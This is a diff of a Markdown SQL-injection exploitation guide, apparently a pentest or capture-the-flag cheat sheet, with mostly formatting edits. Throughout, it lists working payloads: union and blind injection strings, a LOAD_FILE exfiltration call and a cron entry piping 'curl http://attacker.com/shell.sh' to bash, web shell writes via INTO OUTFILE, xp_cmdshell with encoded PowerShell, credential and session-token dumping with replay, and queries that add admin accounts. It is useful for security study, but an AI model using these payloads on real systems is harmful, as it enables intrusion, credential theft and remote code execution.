@@ -256,10 +256,12 @@ LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'\\.attacker.com\\'
 If UNION/errors don’t work: 
 
 `1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'a'-- -`
+
 Automate with:
+
 `sqlmap -u URL --technique=T --dbs`
 
-***Pivoting and lateral movement***-
+## Pivoting and lateral movement
 ## In the application layer(SQL Access) look for ways to:
 
     -steal more credentials(RDS, Redis, SMTP)
@@ -268,8 +270,14 @@ Automate with:
     -poison internal cache or jobs
 credential extraction-pivot Look for: 
 ```sql
-SELECT * FROM users; SELECT * FROM environment; SELECT * FROM credentials; Find SMTP/Redis/AWS keys: aws_access_key=AKIA.... smtp://username:password@mail.internal
+SELECT * FROM users; 
+SELECT * FROM environment; 
+SELECT * FROM credentials;
 ```
+Find SMTP/Redis/AWS keys: 
+
+`aws_access_key=AKIA.... smtp://username:password@mail.internal`
+
 if creds found try logging into:
     -Internal admin panels
     -S3 buckets
@@ -282,8 +290,11 @@ if creds found try logging into:
 If you can write files: 
 
 MySQL (Linux/PHP):
+
 `UNION SELECT "" INTO OUTFILE '/var/www/html/shell.php' then: GET /shell.php?cmd=whoami`
+
 MSSQL:
+
 `exec xp_cmdshell 'powershell -enc ...'`
 
 ## Access other internal systems(service pivot)
@@ -291,7 +302,9 @@ MSSQL:
 Use SQLi to: 
 
 Dump internal subdomains: 
+
 `SELECT host FROM logs WHERE referrer LIKE '%internal%'`
+
 Pivot to Redis if Redis is reachable and unauthenticated, poison it:
 ```sql
 SET CONFIG rewrite-command 'FLUSHALL' 'GETFLAG' Poison scheduled jobs or cron via DB injections: INSERT INTO cron (cmd) VALUES ('curl http://attacker.com/shell.sh | bash');
@@ -307,9 +320,13 @@ query { user(id: "1' UNION SELECT password FROM users--") { id } }
 ## Steal session/Auth Tokens
 
 `SELECT token, ip FROM sessions;`
+
 or:
+
 `SELECT cookie FROM analytics_logs;`
+
 then Replay:
+
 `Cookie: session=stolen_token`
 
 # SQLi Exploitation Flow (Textual Flowchart)
@@ -418,30 +435,40 @@ then Replay:
 
 ## Step 5: Data Exfiltration
 
-MySQL:      
+MySQL:
+
 `?id=1 UNION SELECT username, password FROM users-- -`
-MSSQL:      
+
+MSSQL:  
+
 `?id=1; SELECT name, pass FROM members--`
-PostgreSQL: 
+
+PostgreSQL:
+
 `?id=1 UNION SELECT username || ':' || password FROM auth_table--`
 
 Blind SQLi (Time-Based - MySQL)
+
   `?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)-- -`
 
 ## Step 6: Privilege Escalation
 
 Set Yourself as Admin
+
   `'; UPDATE users SET role='admin' WHERE username='guest';--`
 
 Add a New Admin User (MySQL)
+
   `'; INSERT INTO users (username, password, role) VALUES ('haxor', '123456', 'admin');--`
 
 MSSQL Escalation via Stacked Queries
+
   `'; EXEC sp_addlogin 'haxor', 'Password123!'; EXEC sp_addsrvrolemember 'haxor', 'sysadmin';--`
 
 ## Step 7: Remote Code Execution (RCE)
 
 MySQL – Write Web Shell
+
   `?id=1 UNION SELECT "" INTO OUTFILE '/var/www/html/shell.php'-- -`
 
 PostgreSQL – Command Execution
